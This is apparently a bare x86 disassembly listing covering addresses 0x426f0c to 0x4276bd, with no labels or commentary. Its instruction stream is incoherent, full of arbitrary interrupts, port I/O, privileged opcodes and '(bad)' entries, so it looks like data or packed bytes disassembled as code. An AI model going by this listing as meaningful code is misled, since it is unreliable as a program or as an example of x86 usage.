  426f0c:	xchg   esp,eax
  426f0d:	int    0x76
  426f0f:	mov    ch,0xd4
  426f11:	sbb    al,0xcd
  426f13:	ins    BYTE PTR es:[edi],dx
  426f14:	pop    esp
  426f15:	int    0x8d
  426f17:	mov    ch,0xcd
  426f19:	jle    0x426eaf
  426f1b:	jl     0x426f15
  426f1d:	icebp  
  426f1e:	sub    edi,DWORD PTR [ebp-0x33]
  426f21:	jbe    0x426ed8
  426f23:	int    0x6c
  426f25:	pop    esp
  426f26:	xchg   ebx,edx
  426f28:	in     al,dx
  426f29:	xchg   ebp,ecx
  426f2b:	ins    BYTE PTR es:[edi],dx
  426f2c:	xchg   esp,eax
  426f2d:	or     dh,BYTE PTR [esi-0x43]
  426f30:	int    0x76
  426f32:	std    
  426f33:	int    0x8d
  426f35:	std    
  426f36:	cmp    edi,DWORD PTR [ecx+0x3b]
  426f39:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  426f40:	push   ebx
  426f41:	ror    DWORD PTR [edx],cl
  426f43:	jbe    0x426f59
  426f45:	int    0x76
  426f47:	std    
  426f48:	int    0x8d
  426f4a:	std    
  426f4b:	cmp    edi,DWORD PTR [ecx+0x3b]
  426f4e:	lock shl edx,cl
  426f51:	sub    bl,dl
  426f53:	mov    ebp,0xad35392
  426f58:	jbe    0x426f6e
  426f5a:	int    0x76
  426f5c:	std    
  426f5d:	int    0x8d
  426f5f:	std    
  426f60:	cmp    esi,eax
  426f62:	cmp    edi,DWORD PTR [ecx-0x2d]
  426f65:	repnz sub bl,dl
  426f68:	mov    ebp,0xcdd35392
  426f6d:	lea    esi,[eax]
  426f6f:	or     al,BYTE PTR [ecx-0x36eb69f6]
  426f75:	jbe    0x426f8b
  426f77:	cmp    DWORD PTR [ecx],esp
  426f79:	xchg   BYTE PTR ds:0xb21476c9,dh
  426f7f:	and    DWORD PTR [esi+0x1476c935],eax
  426f85:	imul   esp,DWORD PTR [ecx],0x36eb3586
  426f8b:	xchg   BYTE PTR [eax-0x2893280],al
  426f91:	int    0x8d
  426f93:	std    
  426f94:	cmp    edi,DWORD PTR [ecx+0x3b]
  426f97:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  426f9e:	push   ebx
  426f9f:	ror    DWORD PTR [edx],cl
  426fa1:	jbe    0x426f50
  426fa3:	int    0x76
  426fa5:	mov    ebp,0xa4c7687
  426faa:	jbe    0x426f49
  426fac:	add    dh,dl
  426fae:	popf   
  426faf:	add    dh,dl
  426fb1:	dec    esp
  426fb2:	int    0x8d
  426fb4:	mov    ch,0xbd
  426fb6:	neg    bh
  426fb8:	add    BYTE PTR [eax],al
  426fba:	or     dh,BYTE PTR [esi+0x14]
  426fbd:	int    0x76
  426fbf:	adc    al,0x6
  426fc1:	ins    DWORD PTR es:[edi],dx
  426fc2:	aam    0x60
  426fc4:	int    0x76
  426fc6:	popf   
  426fc7:	or     dh,BYTE PTR [esi-0x5b]
  426fca:	int    0x76
  426fcc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426fcd:	int    0x8d
  426fcf:	dec    esp
  426fd0:	xor    edx,ebx
  426fd2:	or     dh,BYTE PTR [esi-0x5b]
  426fd5:	int    0x76
  426fd7:	adc    al,0xcd
  426fd9:	lea    edx,[ecx*8+0x6e87306c]
  426fe0:	dec    esp
  426fe1:	int    0x8d
  426fe3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426fe4:	inc    ebx
  426fe5:	jge    0x426f69
  426fe7:	sbb    ch,cl
  426fe9:	jbe    0x426fff
  426feb:	int    0x6c
  426fed:	dec    esp
  426fee:	int    0x8d
  426ff0:	adc    al,0x87
  426ff2:	outs   dx,BYTE PTR ds:[esi]
  426ff3:	mov    ch,cl
  426ff5:	lea    esp,[ebp-0x2e142ccd]
  426ffb:	test   DWORD PTR [eax+0x2149bf80],eax
  427001:	xchg   BYTE PTR ds:0xc90da60a,dh
  427007:	jbe    0x427086
  427009:	inc    ecx
  42700a:	and    DWORD PTR [esi+0x7576c935],eax
  427010:	cmp    DWORD PTR [ecx],esp
  427012:	xchg   BYTE PTR ds:0xb26d76c9,dh
  427018:	and    DWORD PTR [esi+0xd76cf35],eax
  42701e:	or     dh,BYTE PTR [esi-0xb]
  427021:	iret   
  427022:	jbe    0x4270a1
  427024:	or     dh,BYTE PTR [esi+0x11]
  427027:	iret   
  427028:	jbe    0x42709f
  42702a:	or     dh,BYTE PTR [esi+0x14]
  42702d:	iret   
  42702e:	jbe    0x42709d
  427030:	or     dh,BYTE PTR [esi-0x13]
  427033:	int    0x76
  427035:	std    
  427036:	int    0x8d
  427038:	std    
  427039:	cmp    edi,DWORD PTR [ecx+0x3b]
  42703c:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  427043:	push   ebx
  427044:	ror    DWORD PTR [edx],cl
  427046:	jbe    0x426fed
  427048:	jmp    0x42705d
  42704a:	xchg   DWORD PTR [eax-0x4d03ed80],eax
  427050:	and    DWORD PTR [esi-0x22fad0cb],eax
  427056:	xchg   DWORD PTR [eax+0x4cc080],eax
  42705c:	(bad)  
  42705d:	popf   
  42705e:	iret   
  42705f:	jbe    0x427031
  427061:	jo     0x427020
  427063:	xlat   BYTE PTR ds:[ebx]
  427064:	fild   WORD PTR [eax]
  427066:	add    ch,cl
  427068:	jbe    0x427063
  42706a:	int    0x8d
  42706c:	stc    
  42706d:	cmp    edi,DWORD PTR [ecx+0x3b]
  427070:	lock shl edx,cl
  427073:	sub    bl,dl
  427075:	mov    ebp,0xad35392
  42707a:	jbe    0x427029
  42707c:	or     ah,BYTE PTR [esi-0x6a29ae6b]
  427082:	int    0x76
  427084:	xchg   ebp,eax
  427085:	sar    DWORD PTR [ebp-0x2c1ec46e],cl
  42708b:	in     eax,0x28
  42708d:	push   ebx
  42708e:	popf   
  42708f:	or     ah,BYTE PTR [esi-0x689325b]
  427095:	int    0x8d
  427097:	stc    
  427098:	cmp    esi,eax
  42709a:	shl    edx,cl
  42709c:	sub    BYTE PTR [ebx],bh
  42709e:	jns    0x427073
  4270a0:	mov    ebp,0xcdd35392
  4270a5:	(bad)  
  4270a6:	stc    
  4270a7:	int    0x96
  4270a9:	stc    
  4270aa:	cmp    ecx,DWORD PTR [edi]
  4270ac:	cmp    ebx,ecx
  4270ae:	shr    ebx,cl
  4270b0:	xchg   edx,eax
  4270b1:	shr    edx,cl
  4270b3:	sub    BYTE PTR [ebx+0x13],dl
  4270b6:	xchg   ebx,edx
  4270b8:	int    0x8d
  4270ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4270bb:	or     ah,BYTE PTR [esi-0x2982bc9b]
  4270c1:	sub    ch,cl
  4270c3:	jbe    0x4270be
  4270c5:	int    0x8d
  4270c7:	stc    
  4270c8:	cmp    edi,DWORD PTR [ecx+0x3b]
  4270cb:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4270d2:	push   ebx
  4270d3:	shl    DWORD PTR [eax-0x40],cl
  4270d6:	dec    esp
  4270d7:	iret   
  4270d8:	jbe    0x4270aa
  4270da:	jo     0x427099
  4270dc:	sti    
  4270dd:	std    
  4270de:	add    BYTE PTR [eax],al
  4270e0:	int    0x76
  4270e2:	std    
  4270e3:	int    0x8d
  4270e5:	std    
  4270e6:	cmp    edi,DWORD PTR [ecx+0x3b]
  4270e9:	lock shl edx,cl
  4270ec:	sub    bl,dl
  4270ee:	mov    ebp,0xcdd35392
  4270f3:	lea    esp,[ebp+0x28d47d43]
  4270f9:	int    0x76
  4270fb:	std    
  4270fc:	int    0x8d
  4270fe:	std    
  4270ff:	cmp    edi,DWORD PTR [ecx+0x3b]
  427102:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  427109:	push   ebx
  42710a:	shl    DWORD PTR [eax-0x40],cl
  42710d:	dec    esp
  42710e:	iret   
  42710f:	jbe    0x4270e1
  427111:	jo     0x4270d0
  427113:	mov    edi,0xcd0000fd
  427118:	jbe    0x42710f
  42711a:	int    0x8d
  42711c:	cmc    
  42711d:	int    0x89
  42711f:	int    0x80
  427121:	cmp    esi,eax
  427123:	cmp    edi,DWORD PTR [ecx-0x2d]
  427126:	repnz sub bl,dl
  427129:	mov    ebp,0xcad35392
  42712e:	je     0x4270b5
  427130:	ror    ch,1
  427132:	(bad)  
  427133:	std    
  427134:	int    0x96
  427136:	std    
  427137:	cmp    ecx,DWORD PTR [edi]
  427139:	cmp    ebx,ecx
  42713b:	shr    ebx,cl
  42713d:	xchg   edx,eax
  42713e:	shr    edx,cl
  427140:	sub    BYTE PTR [edi],ch
  427142:	pop    ecx
  427143:	ins    DWORD PTR es:[edi],dx
  427144:	push   ebx
  427145:	adc    eax,DWORD PTR [ebx-0x2d]
  427148:	das    
  427149:	add    eax,0x80809212
  42714e:	int    0x76
  427150:	adc    ebp,ecx
  427152:	lea    edx,[ecx]
  427154:	int    0x89
  427156:	int    0x80
  427158:	cmp    esi,eax
  42715a:	cmp    edi,DWORD PTR [ecx-0x2d]
  42715d:	repnz sub bl,dl
  427160:	mov    ebp,0xcad35392
  427165:	je     0x4270ec
  427167:	ror    ch,1
  427169:	(bad)  
  42716a:	std    
  42716b:	int    0x96
  42716d:	std    
  42716e:	cmp    ecx,DWORD PTR [edi]
  427170:	cmp    ebx,ecx
  427172:	shr    ebx,cl
  427174:	xchg   edx,eax
  427175:	shr    edx,cl
  427177:	sub    BYTE PTR [edi],ch
  427179:	pop    ecx
  42717a:	ins    DWORD PTR es:[edi],dx
  42717b:	push   ebx
  42717c:	adc    eax,DWORD PTR [ebx-0x2d]
  42717f:	das    
  427180:	add    eax,0x8080928a
  427185:	int    0x76
  427187:	adc    al,0xcd
  427189:	lea    edx,[ecx*8+0x3b80cd89]
  427190:	lock cmp edi,DWORD PTR [ecx-0x2d]
  427194:	repnz sub bl,dl
  427197:	mov    ebp,0xcad35392
  42719c:	je     0x427123
  42719e:	ror    ch,1
  4271a0:	(bad)  
  4271a1:	std    
  4271a2:	int    0x96
  4271a4:	std    
  4271a5:	cmp    ecx,DWORD PTR [edi]
  4271a7:	cmp    ebx,ecx
  4271a9:	shr    ebx,cl
  4271ab:	xchg   edx,eax
  4271ac:	shr    edx,cl
  4271ae:	sub    BYTE PTR [edi],ch
  4271b0:	pop    ecx
  4271b1:	ins    DWORD PTR es:[edi],dx
  4271b2:	push   ebx
  4271b3:	adc    eax,DWORD PTR [ebx-0x2d]
  4271b6:	das    
  4271b7:	add    eax,0x8080921b
  4271bc:	int    0x76
  4271be:	in     eax,dx
  4271bf:	int    0x8d
  4271c1:	in     eax,dx
  4271c2:	int    0x89
  4271c4:	int    0x80
  4271c6:	cmp    esi,eax
  4271c8:	cmp    edi,DWORD PTR [ecx-0x2d]
  4271cb:	repnz sub bl,dl
  4271ce:	mov    ebp,0xcad35392
  4271d3:	je     0x42715a
  4271d5:	ror    ch,1
  4271d7:	(bad)  
  4271d8:	std    
  4271d9:	int    0x96
  4271db:	std    
  4271dc:	cmp    ecx,DWORD PTR [edi]
  4271de:	cmp    ebx,ecx
  4271e0:	shr    ebx,cl
  4271e2:	xchg   edx,eax
  4271e3:	shr    edx,cl
  4271e5:	sub    BYTE PTR [edi],ch
  4271e7:	pop    ecx
  4271e8:	ins    DWORD PTR es:[edi],dx
  4271e9:	push   ebx
  4271ea:	adc    eax,DWORD PTR [ebx-0x2d]
  4271ed:	das    
  4271ee:	add    eax,0x808081a5
  4271f3:	int    0x76
  4271f5:	adc    ebp,ecx
  4271f7:	lea    edx,[ecx]
  4271f9:	int    0x89
  4271fb:	int    0x80
  4271fd:	cmp    esi,eax
  4271ff:	shl    edx,cl
  427201:	sub    BYTE PTR [ebx],bh
  427203:	jns    0x4271d8
  427205:	mov    ebp,0xcad35392
  42720a:	je     0x427191
  42720c:	ror    ch,1
  42720e:	(bad)  
  42720f:	cmc    
  427210:	int    0x89
  427212:	int    0x96
  427214:	cmc    
  427215:	int    0x22
  427217:	cmp    ecx,DWORD PTR [edi]
  427219:	shr    ebx,cl
  42721b:	xchg   edx,eax
  42721c:	cmp    ebx,ecx
  42721e:	shr    edx,cl
  427220:	sub    BYTE PTR [ebx+0x13],dl
  427223:	retf   0x4d8c
  427226:	rol    BYTE PTR [edx-0x2d],1
  427229:	int    0x8d
  42722b:	adc    al,0xcd
  42722d:	mov    ebp,ecx
  42722f:	xchg   esi,eax
  427230:	adc    al,0xcd
  427232:	and    bh,BYTE PTR [ebx]
  427234:	psrlq  mm5,mm3
  427237:	xchg   edx,eax
  427238:	cmp    ebx,ecx
  42723a:	shr    edx,cl
  42723c:	sub    BYTE PTR [ebx+0x13],dl
  42723f:	retf   0x4d8c
  427242:	ror    BYTE PTR [edx-0x2d],1
  427245:	int    0x8d
  427247:	cmc    
  427248:	int    0x89
  42724a:	int    0x96
  42724c:	cmc    
  42724d:	int    0x22
  42724f:	cmp    ecx,DWORD PTR [edi]
  427251:	cmp    ebx,ecx
  427253:	shr    ebx,cl
  427255:	xchg   edx,eax
  427256:	shr    edx,cl
  427258:	sub    BYTE PTR [ebx+0x13],dl
  42725b:	retf   0x4d8c
  42725e:	push   ebp
  42725f:	pusha  
  427260:	jge    0x427291
  427262:	push   es
  427263:	mov    esp,0xcd808081
  427268:	jbe    0x42727e
  42726a:	int    0x8d
  42726c:	adc    al,0xcd
  42726e:	mov    ebp,ecx
  427270:	cmp    BYTE PTR [ebx],0xf0
  427273:	shl    edx,cl
  427275:	sub    BYTE PTR [ebx],bh
  427277:	jns    0x42724c
  427279:	mov    ebp,0xcad35392
  42727e:	je     0x427205
  427280:	ror    ch,1
  427282:	lea    edx,[ecx]
  427284:	int    0x89
  427286:	int    0x96
  427288:	adc    ebp,ecx
  42728a:	and    bh,BYTE PTR [ebx]
  42728c:	psrlq  mm5,mm3
  42728f:	xchg   edx,eax
  427290:	cmp    ebx,ecx
  427292:	shr    edx,cl
  427294:	sub    BYTE PTR [ebx+0x13],dl
  427297:	retf   0x4d8c
  42729a:	rol    BYTE PTR [edx-0x2d],1
  42729d:	int    0x8d
  42729f:	in     eax,dx
  4272a0:	int    0x89
  4272a2:	int    0x96
  4272a4:	in     eax,dx
  4272a5:	int    0x22
  4272a7:	cmp    ecx,DWORD PTR [edi]
  4272a9:	shr    ebx,cl
  4272ab:	xchg   edx,eax
  4272ac:	cmp    ebx,ecx
  4272ae:	shr    edx,cl
  4272b0:	sub    BYTE PTR [ebx+0x13],dl
  4272b3:	retf   0x4d8c
  4272b6:	ror    BYTE PTR [edx-0x2d],1
  4272b9:	int    0x8d
  4272bb:	adc    ebp,ecx
  4272bd:	mov    ebp,ecx
  4272bf:	xchg   esi,eax
  4272c0:	adc    ebp,ecx
  4272c2:	and    bh,BYTE PTR [ebx]
  4272c4:	(bad)  
  4272c6:	(bad)  
  4272c8:	jmp    0x42725c
  4272ca:	shr    edx,cl
  4272cc:	sub    BYTE PTR [ebx+0x13],dl
  4272cf:	retf   0x4d8c
  4272d2:	push   ebp
  4272d3:	pusha  
  4272d4:	jge    0x427305
  4272d6:	push   es
  4272d7:	cmc    
  4272d8:	add    BYTE PTR [eax-0x12893280],0xcd
  4272df:	(bad)  
  4272e0:	in     eax,dx
  4272e1:	int    0x89
  4272e3:	int    0x80
  4272e5:	cmp    esi,eax
  4272e7:	shl    edx,cl
  4272e9:	sub    BYTE PTR [ebx],bh
  4272eb:	jns    0x4272c0
  4272ed:	mov    ebp,0xcad35392
  4272f2:	je     0x427279
  4272f4:	ror    ch,1
  4272f6:	lea    edx,[ecx*8+0x1496cd89]
  4272fd:	int    0x22
  4272ff:	cmp    ecx,DWORD PTR [edi]
  427301:	shr    ebx,cl
  427303:	xchg   edx,eax
  427304:	cmp    ebx,ecx
  427306:	shr    edx,cl
  427308:	sub    BYTE PTR [ebx+0x13],dl
  42730b:	retf   0x4d8c
  42730e:	rol    BYTE PTR [edx-0x2d],1
  427311:	int    0x8d
  427313:	cmc    
  427314:	int    0x89
  427316:	int    0x96
  427318:	cmc    
  427319:	int    0x22
  42731b:	cmp    ecx,DWORD PTR [edi]
  42731d:	shr    ebx,cl
  42731f:	xchg   edx,eax
  427320:	cmp    ebx,ecx
  427322:	shr    edx,cl
  427324:	sub    BYTE PTR [ebx+0x13],dl
  427327:	retf   0x4d8c
  42732a:	ror    BYTE PTR [edx-0x2d],1
  42732d:	int    0x8d
  42732f:	adc    al,0xcd
  427331:	mov    ebp,ecx
  427333:	xchg   esi,eax
  427334:	adc    al,0xcd
  427336:	and    bh,BYTE PTR [ebx]
  427338:	(bad)  
  42733a:	(bad)  
  42733c:	jmp    0x4272d0
  42733e:	shr    edx,cl
  427340:	sub    BYTE PTR [ebx+0x13],dl
  427343:	retf   0x4d8c
  427346:	push   ebp
  427347:	pusha  
  427348:	jge    0x427379
  42734a:	push   es
  42734b:	add    DWORD PTR [eax+0x76cd8080],eax
  427351:	in     eax,dx
  427352:	int    0x8d
  427354:	in     eax,dx
  427355:	int    0x89
  427357:	int    0x80
  427359:	cmp    esi,eax
  42735b:	shl    edx,cl
  42735d:	sub    BYTE PTR [ebx],bh
  42735f:	jns    0x427334
  427361:	mov    ebp,0xcad35392
  427366:	je     0x4272ed
  427368:	ror    ch,1
  42736a:	(bad)  
  42736b:	cmc    
  42736c:	int    0x89
  42736e:	int    0x96
  427370:	cmc    
  427371:	int    0x22
  427373:	cmp    ecx,DWORD PTR [edi]
  427375:	shr    ebx,cl
  427377:	xchg   edx,eax
  427378:	cmp    ebx,ecx
  42737a:	shr    edx,cl
  42737c:	sub    BYTE PTR [ebx+0x13],dl
  42737f:	retf   0x4d8c
  427382:	rol    BYTE PTR [edx-0x2d],1
  427385:	int    0x8d
  427387:	adc    ebp,ecx
  427389:	mov    ebp,ecx
  42738b:	xchg   esi,eax
  42738c:	adc    ebp,ecx
  42738e:	and    bh,BYTE PTR [ebx]
  427390:	psrlq  mm5,mm3
  427393:	xchg   edx,eax
  427394:	cmp    ebx,ecx
  427396:	shr    edx,cl
  427398:	sub    BYTE PTR [ebx+0x13],dl
  42739b:	retf   0x4d8c
  42739e:	ror    BYTE PTR [edx-0x2d],1
  4273a1:	int    0x8d
  4273a3:	in     eax,dx
  4273a4:	int    0x89
  4273a6:	int    0x96
  4273a8:	in     eax,dx
  4273a9:	int    0x22
  4273ab:	cmp    ecx,DWORD PTR [edi]
  4273ad:	cmp    ebx,ecx
  4273af:	shr    ebx,cl
  4273b1:	xchg   edx,eax
  4273b2:	shr    edx,cl
  4273b4:	sub    BYTE PTR [ebx+0x13],dl
  4273b7:	retf   0x4d8c
  4273ba:	push   ebp
  4273bb:	pusha  
  4273bc:	jge    0x427394
  4273be:	xor    bh,cl
  4273c0:	jbe    0x427392
  4273c2:	jo     0x427381
  4273c4:	outs   dx,DWORD PTR ds:[esi]
  4273c5:	lods   eax,DWORD PTR ds:[esi]
  4273c6:	add    BYTE PTR [eax],al
  4273c8:	int    0x8d
  4273ca:	pop    ebp
  4273cb:	inc    ebx
  4273cc:	rcl    esp,cl
  4273ce:	push   ss
  4273cf:	int    0x76
  4273d1:	std    
  4273d2:	int    0x8d
  4273d4:	std    
  4273d5:	cmp    esi,eax
  4273d7:	cmp    edi,DWORD PTR [ecx-0x2d]
  4273da:	repnz sub bl,dl
  4273dd:	mov    ebp,0xad35392
  4273e2:	jbe    0x427391
  4273e4:	int    0x76
  4273e6:	stc    
  4273e7:	int    0xa6
  4273e9:	stc    
  4273ea:	int    0x76
  4273ec:	stc    
  4273ed:	int    0x8d
  4273ef:	stc    
  4273f0:	cmp    ebp,DWORD PTR [ecx-0x132c36c5]
  4273f6:	xchg   edx,eax
  4273f7:	shr    DWORD PTR [ebp-0x7862acd8],cl
  4273fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4273fe:	gs int 0x76
  427401:	xchg   ebp,eax
  427402:	cmp    ecx,DWORD PTR [edi]
  427404:	add    al,0xf2
  427406:	std    
  427407:	add    al,0xad
  427409:	std    
  42740a:	shr    esp,cl
  42740c:	sub    BYTE PTR [edi+0x12db537d],al
  427412:	hlt    
  427413:	dec    ecx
  427414:	and    DWORD PTR [esi-0x28932cb],eax
  42741a:	int    0x8d
  42741c:	std    
  42741d:	cmp    esi,eax
  42741f:	cmp    edi,DWORD PTR [ecx-0x2d]
  427422:	repnz sub bl,dl
  427425:	mov    ebp,0xcdd35392
  42742a:	lea    ebp,[ebp+0x52f7d43]
  427430:	push   ds
  427431:	std    
  427432:	add    BYTE PTR [eax],al
  427434:	int    0x76
  427436:	std    
  427437:	int    0x8d
  427439:	std    
  42743a:	cmp    edi,DWORD PTR [ecx+0x3b]
  42743d:	lock shl edx,cl
  427440:	sub    bl,dl
  427442:	mov    ebp,0xcdd35392
  427447:	lea    ebp,[ebp+0x1ad67d43]
  42744d:	int    0x76
  42744f:	stc    
  427450:	int    0x8d
  427452:	stc    
  427453:	cmp    edi,DWORD PTR [ecx+0x3b]
  427456:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  42745d:	push   ebx
  42745e:	shr    ebx,cl
  427460:	jle    0x4273e3
  427462:	add    BYTE PTR [eax+0x5b6324c0],0x0
  427469:	(bad)  
  42746a:	popf   
  42746b:	iret   
  42746c:	jbe    0x427483
  42746e:	jo     0x42742d
  427470:	jge    0x42744d
  427472:	add    BYTE PTR [eax],al
  427474:	int    0x76
  427476:	std    
  427477:	int    0x8d
  427479:	std    
  42747a:	cmp    edi,DWORD PTR [ecx+0x3b]
  42747d:	lock shl edx,cl
  427480:	sub    bl,dl
  427482:	mov    ebp,0xcdd35392
  427487:	lea    esp,[ebp+0x5bd4d343]
  42748d:	int    0x76
  42748f:	stc    
  427490:	int    0x8d
  427492:	stc    
  427493:	cmp    edi,DWORD PTR [ecx+0x3b]
  427496:	lock shl edx,cl
  427499:	sub    bl,dl
  42749b:	mov    ebp,0xcdd35392
  4274a0:	lea    esp,[ebp+0x26d4d343]
  4274a6:	int    0x76
  4274a8:	stc    
  4274a9:	int    0x8d
  4274ab:	stc    
  4274ac:	cmp    edi,DWORD PTR [ecx+0x3b]
  4274af:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4274b6:	push   ebx
  4274b7:	shl    DWORD PTR [eax+0x5b],cl
  4274ba:	iret   
  4274bb:	jbe    0x4274d2
  4274bd:	jo     0x42747c
  4274bf:	das    
  4274c0:	cli    
  4274c1:	add    BYTE PTR [eax],al
  4274c3:	int    0x76
  4274c5:	std    
  4274c6:	int    0x8d
  4274c8:	std    
  4274c9:	cmp    edi,DWORD PTR [ecx+0x3b]
  4274cc:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4274d3:	push   ebx
  4274d4:	shl    DWORD PTR [eax+0x5b],cl
  4274d7:	iret   
  4274d8:	jbe    0x4274ef
  4274da:	jo     0x427499
  4274dc:	sti    
  4274dd:	stc    
  4274de:	add    BYTE PTR [eax],al
  4274e0:	int    0x76
  4274e2:	popf   
  4274e3:	xchg   ebp,eax
  4274e5:	or     dh,BYTE PTR [esi+0x14]
  4274e8:	add    dh,dl
  4274ea:	cmp    eax,0xcd14d600
  4274ef:	jbe    0x427526
  4274f1:	xchg   DWORD PTR [esi-0x78],esi
  4274f4:	jo     0x4274b3
  4274f6:	push   edx
  4274f7:	fild   DWORD PTR [eax]
  4274f9:	add    ch,cl
  4274fb:	jbe    0x4274fa
  4274fd:	int    0x8d
  4274ff:	std    
  427500:	cmp    edi,DWORD PTR [ecx+0x3b]
  427503:	lock shl edx,cl
  427506:	sub    bl,dl
  427508:	mov    ebp,0xcdd35392
  42750d:	lea    esp,[ebp-0x592b2cbd]
  427513:	int    0x76
  427515:	stc    
  427516:	int    0x8d
  427518:	stc    
  427519:	cmp    edi,DWORD PTR [ecx+0x3b]
  42751c:	lock shl edx,cl
  42751f:	sub    bl,dl
  427521:	mov    ebp,0xcdd35392
  427526:	lea    esp,[ebp+0x32d4d343]
  42752c:	int    0x76
  42752e:	stc    
  42752f:	int    0x8d
  427531:	stc    
  427532:	cmp    edi,DWORD PTR [ecx-0x2d]
  427535:	mov    ebp,0xd3f03b92
  42753a:	repnz sub BYTE PTR [ebx-0x2d],dl
  42753e:	jo     0x427540
  427540:	(bad)  
  427541:	cmp    eax,0x873576cd
  427546:	jbe    0x4274d0
  427548:	jo     0x427507
  42754a:	add    eax,0xcd0000f9
  42754f:	jbe    0x42754e
  427551:	int    0x8d
  427553:	std    
  427554:	cmp    edi,DWORD PTR [ecx-0x2d]
  427557:	mov    ebp,0xd3f03b92
  42755c:	repnz sub BYTE PTR [ebx-0x2d],dl
  427560:	jo     0x427562
  427562:	(bad)  
  427563:	cmp    eax,0x873576cd
  427568:	jbe    0x4274f2
  42756a:	jo     0x427529
  42756c:	jb     0x427567
  42756e:	add    BYTE PTR [eax],al
  427570:	int    0x8d
  427572:	inc    ebp
  427573:	int    0x76
  427575:	inc    ebp
  427576:	cmp    ecx,ecx
  427578:	cmp    ecx,DWORD PTR [edi]
  42757a:	shr    ebx,cl
  42757c:	xchg   edx,eax
  42757d:	shr    DWORD PTR [ebp-0x322cacd8],cl
  427583:	lea    ebp,ds:0x803fd33b
  427589:	add    DWORD PTR [eax+0x3614d480],0x80800180
  427593:	jo     0x427595
  427595:	(bad)  
  427596:	cmp    eax,0x87358dcd
  42759b:	lea    ecx,[eax+0xa95abd]
  4275a1:	add    ch,cl
  4275a3:	jbe    0x4275d5
  4275a5:	int    0x8d
  4275a7:	cmp    eax,0x76cd8881
  4275ac:	cmp    eax,0xabd7687
  4275b1:	jbe    0x427570
  4275b3:	int    0x76
  4275b5:	stc    
  4275b6:	int    0x8d
  4275b8:	stc    
  4275b9:	cmp    esi,eax
  4275bb:	shl    edx,cl
  4275bd:	sub    BYTE PTR [ebx],bh
  4275bf:	jns    0x427594
  4275c1:	mov    ebp,0xcdd35392
  4275c6:	lea    edi,[ebp-0x322c2ed1]
  4275cc:	(bad)  
  4275cd:	std    
  4275ce:	int    0x96
  4275d0:	std    
  4275d1:	cmp    ecx,DWORD PTR [edi]
  4275d3:	cmp    ebx,ecx
  4275d5:	shr    ebx,cl
  4275d7:	xchg   edx,eax
  4275d8:	shr    edx,cl
  4275da:	sub    BYTE PTR [ebx+0x13],dl
  4275dd:	xchg   DWORD PTR [ebp+0x2fd343f1],ecx
  4275e3:	or     edi,DWORD PTR [ecx]
  4275e5:	cli    
  4275e6:	add    BYTE PTR [eax],al
  4275e8:	int    0x76
  4275ea:	mov    BYTE PTR [edx-0x2d349c58],ch
  4275f0:	xor    BYTE PTR [eax+0x4edcd96],al
  4275f6:	in     eax,dx
  4275f7:	adc    al,0x5b
  4275f9:	cwde   
  4275fa:	call   0xcd34:0x76cd6d3b
  427601:	add    DWORD PTR ds:0xcd808081,ebp
  427607:	xchg   esi,eax
  427608:	mov    ch,cl
  42760a:	or     ch,0xd6
  42760d:	dec    esp
  42760e:	int    0xe6
  427610:	mov    ch,cl
  427612:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427613:	dec    esp
  427614:	or     dh,BYTE PTR [esi-0x3]
  427617:	pop    edi
  427618:	jnp    0x427651
  42761a:	ficom  WORD PTR [ebx]
  42761c:	cmp    esp,ebx
  42761e:	pop    ebp
  42761f:	mov    ebp,0x3b25230a
  427624:	adc    DWORD PTR [edi],ebp
  427626:	inc    ebp
  427627:	sti    
  427628:	xchg   edx,eax
  427629:	shr    ecx,cl
  42762b:	sub    BYTE PTR [edx],dl
  42762d:	clc    
  42762e:	add    BYTE PTR [eax-0x102c9380],0x92
  427635:	cmp    ebx,ebp
  427637:	push   ebx
  427638:	clc    
  427639:	int    0xe6
  42763b:	sbb    al,0x53
  42763d:	aad    0x43
  42763f:	(bad)  
  427641:	sbb    eax,DWORD PTR [ebx-0xc]
  427644:	(bad)  
  427645:	das    
  427646:	adc    cl,BYTE PTR [ebp+0x59]
  427649:	je     0x4275f5
  42764b:	push   edi
  42764c:	ja     0x427613
  42764e:	xchg   edi,eax
  42764f:	shr    ebx,0xd9
  427652:	add    DWORD PTR [eax+0x3096cd80],0xcd14d6cd
  42765c:	xchg   esi,eax
  42765d:	mov    ch,cl
  42765f:	(bad)  
  427660:	dec    esp
  427661:	int    0x96
  427663:	mov    ch,cl
  427665:	(bad)  
  427666:	dec    esp
  427667:	int    0xe6
  427669:	mov    ch,cl
  42766b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42766c:	dec    esp
  42766d:	cmp    edx,DWORD PTR [ecx]
  42766f:	cmp    esp,ebx
  427671:	das    
  427672:	inc    ebp
  427673:	sti    
  427674:	xchg   edx,eax
  427675:	shr    ecx,cl
  427677:	sub    BYTE PTR [edx],dl
  427679:	clc    
  42767a:	add    BYTE PTR [eax-0x22c49380],0x53
  427681:	aad    0xd3
  427683:	out    dx,eax
  427684:	xchg   edx,eax
  427685:	push   ebx
  427686:	clc    
  427687:	int    0xe6
  427689:	xor    ch,cl
  42768b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42768c:	adc    al,0x3b
  42768e:	popf   
  42768f:	int    0x76
  427691:	xor    BYTE PTR [ebx],bh
  427693:	cli    
  427694:	int    0x8d
  427696:	adc    al,0x2f
  427698:	inc    ebp
  427699:	loope  0x42762d
  42769b:	shr    DWORD PTR [ebp+0x53cb3b28],cl
  4276a1:	cli    
  4276a2:	push   esi
  4276a3:	add    BYTE PTR [eax-0x132c9380],0x92
  4276aa:	push   ebx
  4276ab:	popf   
  4276ac:	int    0x76
  4276ae:	mov    BYTE PTR [edi-0x320be427],al
  4276b4:	bswap  ebp
  4276b6:	(bad)  
  4276b7:	dec    esp
  4276b8:	int    0xe6
  4276ba:	xor    ch,cl
  4276bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4276bd:	adc    al,0x4
